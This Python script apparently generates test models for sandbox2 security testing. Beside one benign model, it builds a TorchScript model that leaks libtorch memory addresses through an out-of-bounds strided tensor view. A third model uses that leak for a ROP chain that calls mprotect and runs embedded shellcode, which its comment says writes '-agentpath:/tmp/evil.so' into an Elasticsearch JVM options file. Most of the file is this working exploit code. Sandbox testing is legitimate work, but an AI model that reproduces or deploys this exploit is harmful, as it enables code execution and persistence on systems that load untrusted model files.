#!/usr/bin/env python3
"""
Generate evil PyTorch models for testing sandbox2 security.

This script generates three models:
1. model_benign.pt - A simple benign model for positive testing
2. model_leak.pt - A model that leaks heap addresses via assertion errors
3. model_exploit.pt - A model that attempts to write files using shellcode manipulation
"""

import torch
import sys
import os


class SimpleBenignModel(torch.nn.Module):
    """A simple benign model that performs basic tensor operations."""
    
    def __init__(self):
        super().__init__()
    
    def forward(self, a, b, c, d):
        # Simple forward pass - just return a simple output tensor
        # This model doesn't need to do anything complex, just validate the test infrastructure
        output = torch.sum(a) + torch.sum(b) + torch.sum(c) + torch.sum(d)
        return output.unsqueeze(0).unsqueeze(0)  # Return shape [1, 1]


class LeakModel(torch.nn.Module):
    """Model that leaks heap addresses via assertion errors."""
    
    def __init__(self):
        super().__init__()
    
    def find_heap_overlap(self, tensors):
        evil_length = 0x900 * 8
        leak = torch.as_strided(tensors, [evil_length], [1], 2305843009213693952 - evil_length)
        index = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if leak[i + 3].item() == leak[i + 5].item() and leak[i + 3].item() >> 40 == 127:
                if leak[i + 2].item() >= 0x100000000 and leak[i + 2].item() <= 0x100000005:
                    index.append(i)
        return (index, leak)
    
    def forward(self, a, b, c, d):
        tmp = []
        heap_len = 200
        array_len = 0x900
        
        for i in range(heap_len):
            tmp_values = [0xdead00000 + i] + [0xdead00000 + j for j in range(2, array_len)]
            tmp.append(torch.tensor(tmp_values))
        
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
                assert 1 == 0, "Input tensor must have at least one element: " + hex(libtorch_cpu_addr)
        
        for i in range(heap_len):
            print(tmp[i].shape)
        
        return torch.zeros(0)


class ExploitModel(torch.nn.Module):
    """Model that attempts to write files using shellcode manipulation."""
    
    def __init__(self):
        super().__init__()
    
    def find_heap_overlap(self, tensors):
        evil_length = 0x900 * 8
        leak = torch.as_strided(tensors, [evil_length], [1], 2305843009213693952 - evil_length)
        index = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if leak[i + 3].item() == leak[i + 5].item() and leak[i + 3].item() >> 40 == 127:
                if leak[i + 2].item() >= 0x100000000 and leak[i + 2].item() <= 0x100000005:
                    index.append(i)
        return (index, leak)
    
    def get_address_data(self, leak, index: int, tmp, target_addr: int):
        leak[index] = target_addr
        return tmp[0].item()
    
    def forward(self, a, b, c, d):
        tmp = []
        heap_len = 200
        array_len = 0x900
        
        for i in range(heap_len):
            tmp_values = [0xdead00000 + i] + [0xdead00000 + j for j in range(2, array_len)]
            tmp.append(torch.tensor(tmp_values))
        
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
                
                gadget_addr_1 = 0x0000000001335761 + libtorch_cpu_addr  # mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x28]
                gadget_addr_2 = 0x0000000008f0a9e3 + libtorch_cpu_addr  # mov rdi, qword ptr [rax + 0x20] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x20]
                gadget_addr_3 = 0x0000000004e5b605 + libtorch_cpu_addr  # mov rdx, qword ptr [rax] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 8]
                gadget_addr_4 = 0x000000000782e30b + libtorch_cpu_addr  # mov rdi, qword ptr [rax + 0x40] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x18]
                gadget_addr_5 = 0x00000000056062ac + libtorch_cpu_addr  # mov rbx, qword ptr [rax + 8] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x28]
                gadget_addr_6 = 0x00000000041df281 + libtorch_cpu_addr  # mov rdi, qword ptr [rax + 0x40] ; call qword ptr [rax + 0x30]
                mprotect_got_addr = 0xc9785f0 + libtorch_cpu_addr
                
                leak[index + 3] = int(heap_addr - 0x8)
                
                for j in range(heap_len):
                    if tmp[j][2].item() == 0xDEAD00002 and i != j:
                        mprotect_addr = self.get_address_data(leak, index + 3, tmp[j], int(mprotect_got_addr))
                        leak[index + 3] = int(heap_addr)
                        leak[index + 1] = int(heap_addr)
                        tmp[j][1] = int(gadget_addr_1)
                        tmp[j][(0x28) // 8] = int(gadget_addr_2)
                        pianyi1 = 0x40  # mov rdi, qword ptr [rax + 0x20] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x20]
                        tmp[j][(0x20) // 8] = int(heap_addr + pianyi1)
                        tmp[j][(pianyi1) // 8] = int(heap_addr + pianyi1 + 8)
                        pianyi1 += 8
                        tmp[j][(pianyi1 + 0x20) // 8] = int(gadget_addr_3)
                        tmp[j][(pianyi1) // 8] = 7
                        tmp[j][(pianyi1 + 8) // 8] = int(gadget_addr_4)
                        new_pianyi = pianyi1 + 0x40 + 8
                        tmp[j][(pianyi1 + 0x40) // 8] = int(heap_addr + new_pianyi)  # rdi new_pianyi
                        tmp[j][(new_pianyi) // 8] = int(heap_addr + new_pianyi + 0x8)  # rax new_pianyi+0x8
                        new_pianyi += 0x8
                        tmp[j][(new_pianyi + 0x18) // 8] = int(gadget_addr_5)
                        shellcode_painyi = new_pianyi + 0x48
                        tmp[j][(new_pianyi + 0x8) // 8] = int(heap_addr + shellcode_painyi)  # rbx
                        tmp[j][(new_pianyi + 0x28) // 8] = int(gadget_addr_6)
                        tmp[j][(new_pianyi + 0x40) // 8] = int((heap_addr + new_pianyi) & 0xffffffffffff000)
                        tmp[j][(new_pianyi + 0x30) // 8] = int(mprotect_addr)
                        tmp[j][(shellcode_painyi) // 8] = int(heap_addr + shellcode_painyi)  # rax heap_addr+shellcode_painyi
                        tmp[j][(shellcode_painyi + 0x30) // 8] = int(heap_addr + shellcode_painyi + 0x38)
                        
                        # Shellcode that writes "/usr/share/elasticsearch/config/jvm.options.d/gc.options" with "-agentpath:/tmp/evil.so"
                        shellcodes = [8011543407870619976, 5210791687020442736, 7435271660479868856, 3345460298936504419, 3438577825701195887, 5777950549327376227, 8241980339328235592, 3415262028243167331, -5167792111325451163, 7018986666877744431, -5561328400657201072, 5188609366195851841, -8554581930162470863, 8531427691724884167, 5210665247541455977, 8101259050901599416, 7306915769425088559, -1834855863107423122, 5188146771129452360, 5562011009073]
                        
                        start_pianyi = (shellcode_painyi + 0x38) // 8
                        for shellcode in shellcodes:
                            tmp[j][start_pianyi] = shellcode
                            start_pianyi += 1
                        
                        del tmp[j]
                        assert 1 == 0, "Input tensor must have at least one element: "
                        return torch.zeros(0)
        
        for i in range(heap_len):
            print(tmp[i].shape)
        
        return torch.zeros(0)


def generate_models(output_dir):
    """Generate all three models."""
    os.makedirs(output_dir, exist_ok=True)
    
    print("Generating benign model...")
    benign_model = SimpleBenignModel()
    benign_model_script = torch.jit.script(benign_model)
    benign_path = os.path.join(output_dir, "model_benign.pt")
    benign_model_script.save(benign_path)
    print(f"  Saved to {benign_path}")
    
    print("Generating leak model...")
    leak_model = LeakModel()
    leak_model_script = torch.jit.script(leak_model)
    leak_path = os.path.join(output_dir, "model_leak.pt")
    leak_model_script.save(leak_path)
    print(f"  Saved to {leak_path}")
    
    print("Generating exploit model...")
    exploit_model = ExploitModel()
    exploit_model_script = torch.jit.script(exploit_model)
    exploit_path = os.path.join(output_dir, "model_exploit.pt")
    exploit_model_script.save(exploit_path)
    print(f"  Saved to {exploit_path}")
    
    print("All models generated successfully!")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        output_dir = sys.argv[1]
    else:
        output_dir = "."
    
    try:
        generate_models(output_dir)
    except Exception as e:
        print(f"Error generating models: {e}", file=sys.stderr)
        sys.exit(1)

